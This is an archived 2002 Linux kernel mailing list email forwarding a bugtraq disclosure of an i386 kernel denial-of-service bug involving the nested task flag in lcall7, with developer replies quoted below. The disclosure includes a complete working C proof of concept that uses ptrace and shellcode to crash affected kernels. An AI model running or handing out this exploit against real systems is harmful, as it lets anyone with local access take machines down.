Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S263313AbSKMUQn>; Wed, 13 Nov 2002 15:16:43 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S263310AbSKMUQm>; Wed, 13 Nov 2002 15:16:42 -0500
Received: from daytona.gci.com ([205.140.80.57]:57106 "EHLO daytona.gci.com")
	by vger.kernel.org with ESMTP id <S263291AbSKMUQj>;
	Wed, 13 Nov 2002 15:16:39 -0500
Message-ID: <BF9651D8732ED311A61D00105A9CA3150B45FBB0@berkeley.gci.com>
From: Leif Sawyer <lsawyer@gci.com>
To: Alan Cox <alan@lxorguk.ukuu.org.uk>, Christoph Hellwig <hch@infradead.org>
Cc: Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
Subject: RE: FW: i386 Linux kernel DoS (clarification)
Date: Wed, 13 Nov 2002 11:23:15 -0900
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2656.59)
Content-Type: text/plain;
	charset="iso-8859-1"
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Here's a little clarification on the problem:

On Wed, 13 Nov 2002, Stefan Laudat wrote:

> Regarding this issue: is it 80x86 or specifically 80386 designed ?
> Been trying it on AMD Duron, AMD Athlon MP, Intel i586 - just segfaults :(

Yep; the first version of the DoS I posted on bugtraq was defective and
worked only under special conditions (inside gdb for example).

However this updated version works much better:

#include <sys/ptrace.h>

struct user_regs_struct {
        long ebx, ecx, edx, esi, edi, ebp, eax;
        unsigned short ds, __ds, es, __es;
        unsigned short fs, __fs, gs, __gs;
        long orig_eax, eip;
        unsigned short cs, __cs;
        long eflags, esp;
        unsigned short ss, __ss;
};

int main( void )
{
    int pid;
    char dos[] = "\x9A\x00\x00\x00\x00\x07\x00";
    void (* lcall7)( void ) = (void *) dos;
    struct user_regs_struct d;

    if( ! ( pid = fork() ) )
    {
        usleep( 1000 );
        (* lcall7)();
    }
    else
    {
        ptrace( PTRACE_ATTACH, pid, 0, 0 );
        while( 1 )
        {
            wait( 0 );
            ptrace( PTRACE_GETREGS, pid, 0, &d );
            d.eflags |= 0x4100; /* set TF and NT */
            ptrace( PTRACE_SETREGS, pid, 0, &d );
            ptrace( PTRACE_SYSCALL, pid, 0, 0 );
        }
    }

    return 1;
}

At the beginning I thought only kernels <= 2.4.18 were affected; but it
appeared that both kernels 2.4.19 and 2.4.20-rc1 are vulnerable as well.
The flaw seems to be related to the kernel's handling of the nested task 
(NT) flag inside a lcall7. 

-- 
Christophe Devine

> -----Original Message-----
> From: Alan Cox [mailto:alan@lxorguk.ukuu.org.uk]
> Sent: Tuesday, November 12, 2002 3:10 PM
> To: Christoph Hellwig
> Cc: Leif Sawyer; Linux Kernel Mailing List
> Subject: Re: FW: i386 Linux kernel DoS
> 
> 
> On Tue, 2002-11-12 at 23:31, Christoph Hellwig wrote:
> > On Tue, Nov 12, 2002 at 02:28:55PM -0900, Leif Sawyer wrote:
> > > This was posted on bugtraq today...
> > 
> > A real segfaulting program?  wow :)
> 
> Looks like the TF handling bug which was fixed a while ago
> 
